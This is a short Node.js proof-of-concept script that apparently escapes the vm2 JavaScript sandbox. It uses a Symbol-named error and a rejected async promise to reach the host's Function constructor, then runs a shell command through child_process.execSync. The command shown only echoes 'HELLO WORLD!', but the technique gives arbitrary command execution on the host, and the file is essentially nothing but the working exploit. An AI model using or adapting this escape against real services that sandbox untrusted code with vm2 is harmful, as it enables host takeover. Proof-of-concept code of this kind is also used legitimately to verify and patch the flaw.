const { VM } = require("vm2");

const code = `
const error = new Error();
error.name = Symbol();
const f = async () => error.stack;
const promise = f();
promise.catch(e => {
    const Error = e.constructor;
    const Function = Error.constructor;
    const f = new Function(
        "process.mainModule.require('child_process').execSync('echo HELLO WORLD!', { stdio: 'inherit' })"
    );
    f();
});
`;

new VM().run(code);
